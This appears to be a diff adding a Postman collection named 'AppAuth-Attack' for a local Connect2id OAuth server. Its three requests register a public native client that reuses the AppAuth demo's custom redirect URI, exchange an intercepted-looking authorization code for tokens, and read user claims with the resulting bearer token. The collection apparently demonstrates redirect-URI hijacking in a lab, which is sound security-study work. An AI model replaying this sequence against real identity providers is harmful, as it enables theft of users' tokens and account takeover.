@@ -1,0 +1,124 @@
+{
+	"info": {
+		"_postman_id": "168ebeeb-8851-45c6-84b9-a5527a92695f",
+		"name": "AppAuth-Attack",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "Create Client",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "ztucZS1ZyFKgh0tUEruUtiSTXhnexmd6",
+							"type": "string"
+						}
+					]
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"application_type\": \"native\",\n    \"redirect_uris\": [\"net.openid.appauthdemo:/oauth2redirect\"],\n    \"token_endpoint_auth_method\": \"none\"\n}",
+					"options": {
+						"raw": {
+							"language": "json"
+						}
+					}
+				},
+				"url": {
+					"raw": "http://localhost:8080/c2id/clients",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"c2id",
+						"clients"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Exchange Authorization Code",
+			"request": {
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "grant_type",
+							"value": "authorization_code",
+							"type": "text"
+						},
+						{
+							"key": "code",
+							"value": "_plKljMxn3eusDvDSrRhwA.vZVE3hYi7tZxk_vZNOqPDA",
+							"type": "text"
+						},
+						{
+							"key": "redirect_uri",
+							"value": "net.openid.appauthdemo:/oauth2redirect",
+							"type": "text"
+						},
+						{
+							"key": "client_id",
+							"value": "rmjs23cjg6dey",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://localhost:8080/c2id/token",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"c2id",
+						"token"
+					]
+				}
+			},
+			"response": []
+		},
+		{
+			"name": "Get Claims from Userinfo Endpoint",
+			"request": {
+				"auth": {
+					"type": "bearer",
+					"bearer": [
+						{
+							"key": "token",
+							"value": "eyJraWQiOiJDWHVwIiwidHlwIjoiYXQrand0IiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJhbGljZSIsInNjcCI6WyJvcGVuaWQiLCJlbWFpbCIsInByb2ZpbGUiXSwiY2xtIjpbIiFZSUEiXSwiaXNzIjoiaHR0cDpcL1wvYzJpZC5sb2NhbDo4MDgwXC9jMmlkIiwiZXhwIjoxNjA1MzgxNDA0LCJpYXQiOjE2MDUzODA4MDQsInVpcCI6eyJncm91cHMiOlsiYWRtaW4iLCJhdWRpdCJdfSwianRpIjoiU21CcTFMbGJSb0UiLCJjaWQiOiJzeXRzMmdxdWxzeXp5In0.Y1Up4pF-orsyGFxJA5pDvxkMKmFnOOXkzmYHD_6I0W955t42IoONirCayUOfR_ecBGiV2fe3CSA8_fC9U806-ofpl-2FXHB8dYlceJ5DoIYapKTEp8BD-01XUOUx2RFbX4lAZjqp6IPIO94ZG0i-9pahXIph8BFhdfKA5hOR3wrMBvfZ9-9l7pw2niQl8x8qX1BdupNx3ZJae0LwVTkKdpCgQsbdevEaafel3Kav-1HxvA6xzN9IwnY9SYqWthbqzpimkXpK6-LhZC1LwWdKVcvCh6_6cMo-k6lze9u3xI487FiHBbXjmaNJZ3Mi5CCZAJCyKOVnjE795CuHXxnS2Q",
+							"type": "string"
+						}
+					]
+				},
+				"method": "GET",
+				"header": [],
+				"url": {
+					"raw": "http://localhost:8080/c2id/userinfo",
+					"protocol": "http",
+					"host": [
+						"localhost"
+					],
+					"port": "8080",
+					"path": [
+						"c2id",
+						"userinfo"
+					]
+				}
+			},
+			"response": []
+		}
+	],
+	"protocolProfileBehavior": {}
+}
